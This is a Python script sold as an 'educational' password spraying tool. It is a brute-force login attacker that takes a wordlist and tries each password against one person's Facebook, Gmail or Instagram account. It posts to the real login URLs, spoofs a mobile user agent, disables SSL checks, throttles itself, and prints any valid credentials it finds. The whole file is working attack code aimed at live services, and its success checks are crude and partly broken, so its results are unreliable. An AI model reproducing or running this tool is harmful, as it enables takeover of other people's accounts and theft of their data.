#!/usr/bin/env python3
"""
FASTEST_NIHAL - Educational Password Spraying Tool (FIXED v3.0)
SSL Error Fixed + Better Connection Handling
"""

import requests, time, sys, os, signal, ssl
import asyncio, aiohttp
from itertools import islice
import certifi

def banner():
    print("""
    =====================================================
    FASTEST_NIHAL - EDUCATIONAL LOGIN ATTACK TOOL
    Version: 3.0 (SSL Fixed)
    
    LEGAL DISCLAIMER:
    Only use this script against systems you have permission to test.
    =====================================================
    """)

def signal_handler(sig, frame):
    print("\n[!] Attack interrupted by user.")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

SERVICE_NAME = None

async def try_login(session, username, password, payloads, headers, url, semaphore, service_name):
    async with semaphore:
        try:
            start_time = time.time()
            
            payloads[service_name]["password"] = password
            
            timeout = aiohttp.ClientTimeout(total=10.0, connect=5.0)
            
            async with session.post(
                url,
                data=payloads[service_name],
                headers=headers,
                allow_redirects=True,
                timeout=timeout,
                ssl=False  # Bypass SSL verification
            ) as response:
                
                elapsed = time.time() - start_time
                
                if service_name == "gmail":
                    return await response.text() != "", password, elapsed
                
                elif service_name in ["facebook", "instagram"]:
                    try:
                        content = await response.text()
                    except:
                        content = ""
                    
                    fail_indicators = {
                        "facebook": ["login", "incorrect", "wrong", "failed", "error"], 
                        "instagram": ["incorrect", "wrong", "invalid", "error", "checkpoint"]
                    }
                    
                    indicators = fail_indicators.get(service_name, [])
                    is_failed = any(indicator in content.lower() for indicator in indicators)
                    
                    if not is_failed and response.status in [200, 302]:
                        return True, password, elapsed
                
                elif service_name == "twitter":
                    return response.status < 400, password, elapsed
            
            return False, None, time.time() - start_time
        
        except asyncio.TimeoutError:
            return False, None, 0
            
        except aiohttp.ClientError as e:
            # Don't print every error, too noisy
            return False, None, 0
            
        except Exception as e:
            return False, None, 0

def login(service_name, username, password_file_path):
    
    os.system('clear')
    banner()
    
    try:
        with open(password_file_path, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        total_passwords = len(passwords)
        
        print(f"[+] Loaded {total_passwords} passwords from wordlist")
        print(f"[+] Target: {service_name.upper()}")
        print(f"[+] Username: {username}")
        print(f"[+] Starting attack...\n")
        
        payloads = {
            "facebook": {"email": username, "pass": ""},
            "gmail":    {"identifierId": username, "password": ""}, 
            "instagram":{"username": username, "password": "", "queryParams": "{}"}
        }
    
        if service_name not in payloads:
            print(f"[!] Unsupported service: {service_name}")
            return False
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*",
            "Connection": "keep-alive"
        }
        
        service_urls = {
            "facebook": "https://www.facebook.com/login.php", 
            "gmail":    "https://accounts.google.com/signin/v2/identifier",
            "instagram":"https://www.instagram.com/accounts/login/ajax/"
        }
    
        successful = []
        checked = 0
        errors = 0
        
        async def run_attack():
            nonlocal successful, checked, errors
            
            # Create connector with SSL disabled
            connector = aiohttp.TCPConnector(ssl=False, limit=5)
            
            semaphore = asyncio.Semaphore(3)  # Reduced for stability
            
            batch_size = 10  # Smaller batches
            total = len(passwords)
            
            async with aiohttp.ClientSession(connector=connector) as session:
                for i in range(0, total, batch_size):
                    batch = passwords[i:i+batch_size]
                    
                    tasks = []
                    for password in batch:
                        task = asyncio.create_task(
                            try_login(session, username, password, payloads,
                                    headers, service_urls[service_name], semaphore, service_name)
                        )
                        tasks.append(task)
                    
                    results = await asyncio.gather(*tasks)
                    
                    for result in results:
                        checked += 1
                        if result[0]:
                            successful.append(result)
                    
                    progress = min(i + batch_size, total)
                    percent = (progress / total) * 100
                    print(f"[PROGRESS] {progress}/{total} ({percent:.1f}%) - Found: {len(successful)}")
                    
                    # Longer delay for Instagram
                    await asyncio.sleep(2.0)
        
        asyncio.run(run_attack())
        
        print(f"\n{'='*50}")
        print(f"[+] Attack Complete!")
        print(f"[+] Passwords Checked: {checked}")
        print(f"[+] Valid Passwords Found: {len(successful)}")
        
        if successful:
            print(f"\n[SUCCESS] Found {len(successful)} valid credential(s):")
            for success, pwd, elapsed in successful:
                print(f"  ✅ {username}:{pwd}")
        else:
            print(f"\n[!] No valid passwords found.")
        
        print(f"{'='*50}\n")
    
    except FileNotFoundError:
        print(f"[!] Password file not found: {password_file_path}")
    
    return len(successful) > 0

def main():
    service_mapping = {
        "1": {"name": "facebook", "prompt": "Facebook"},
        "2": {"name": "gmail",    "prompt": "Gmail"},
        "3": {"name": "instagram","prompt": "Instagram"}
    }
    
    print("""
Service Options:
[1] Facebook
[2] Gmail 
[3] Instagram

Enter option number: """)
    
    service_choice = input().strip()
    if service_choice not in service_mapping:
        print("[!] Invalid selection!")
        sys.exit(0)
        
    global SERVICE_NAME
    SERVICE_NAME = service_mapping[service_choice]["name"]
    
    username_prompt_map = {
        "facebook": "Email address:",
        "gmail":    "Email or phone number:", 
        "instagram":"Username:"
    }
    
    print(f"\n{username_prompt_map[SERVICE_NAME]}")
    username = input().strip()
    if not username:
        print("[!] Username cannot be empty.")
        sys.exit(0)
    
    while True:
        print("\nEnter path to password list: ")
        password_input = input().strip()
        password_input = os.path.expanduser(password_input)
        
        if os.path.exists(password_input):
            break
        else:
            print(f"[ERROR] File not found: {password_input}")
    
    login(SERVICE_NAME, username, password_input)

if __name__ == "__main__":
    main()
